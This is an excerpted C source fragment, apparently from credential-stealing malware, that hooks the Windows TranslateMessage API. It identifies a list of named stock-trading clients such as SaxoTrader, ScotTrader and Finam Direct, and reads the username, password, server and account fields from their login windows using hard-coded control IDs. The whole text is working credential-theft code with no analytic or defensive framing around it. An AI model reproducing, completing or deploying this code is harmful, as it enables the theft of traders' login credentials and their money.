...
{
	if ( GetWindowID2( hWnd ) == pTradeInfo->dwUserID && pTradeInfo->dwUserID && !pTradeInfo->Username )
	{
	...
	else if ( GetWindowID2( hWnd ) == pTradeInfo->dwPassID && pTradeInfo->dwPassID && !pTradeInfo->Password )
	{
	...
	else if ( GetWindowID2( hWnd ) == pTradeInfo->dwServID && pTradeInfo->dwServID && !pTradeInfo->Server )
	{
	...
	else if ( GetWindowID2( hWnd ) == pTradeInfo->dwAccID && pTradeInfo->dwAccID && !pTradeInfo->UserID )
	{
...
{
	if ( GetWindowID( hWnd ) == pTradeInfo->dwUserID && pTradeInfo->dwUserID && !pTradeInfo->Username )
	{
		if ( ( pTradeInfo->Username = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Username, 100 );
	...
	else if ( GetWindowID( hWnd ) == pTradeInfo->dwPassID && pTradeInfo->dwPassID && !pTradeInfo->Password )
	{
		if ( ( pTradeInfo->Password = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Password, 100 );
	...
	else if ( GetWindowID( hWnd ) == pTradeInfo->dwServID && pTradeInfo->dwServID && !pTradeInfo->Server )
	{
		if ( ( pTradeInfo->Server = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->Server, 100 );
	...
	else if ( GetWindowID( hWnd ) == pTradeInfo->dwAccID && pTradeInfo->dwAccID && !pTradeInfo->UserID )
	{
		if ( ( pTradeInfo->UserID = (char*)MemAlloc( 100 ) ) != NULL )
		{
			pGetWindowTextA( hWnd, pTradeInfo->UserID, 100 );
...
void ParseTrade( HWND hWnd )
{
	...
	if ( IsBlackwoodPro() && GetWindowID( hWnd ) == 1 ) 
	{
	...
	else if ( IsFinamDirect() && GetWindowID( hWnd ) == 1 ) 
	{
	...
	else if ( IsGrayBox() && GetWindowID( hWnd ) == 1 ) 
	{
	...
	else if ( IsMbtPro() && GetWindowID( hWnd ) == 1 )
	{
	...
	else if ( IsLaser() && GetWindowID( hWnd ) == 1 )
	{
	...
	else if ( IsLightSpeed() && GetWindowID( hWnd ) == 1 ) 
	{
	...
	else if ( IsLT() && GetWindowID( hWnd ) == 1 ) 
	{
		pTradeInfo->dwUserID = 5328;
		pTradeInfo->dwPassID = 5329;
		pTradeInfo->dwServID = 159;
	...
	else if ( IsMbt() && GetWindowID( hWnd ) == 1 )
	{
		pTradeInfo->dwUserID = 309;
		pTradeInfo->dwPassID = 310;
	...
	else if ( IsScotTrader() && GetWindowID( hWnd ) == 1 )
	{
	...
	else if ( IsSaxoTrader() && GetWindowID2( hWnd ) == 1442918145 )
	{
...
void HookTrade()
{
	...
	if ( HookApi( 3, 0xC45D9631, (DWORD)&Hook_TranslateMessage ) )
	{
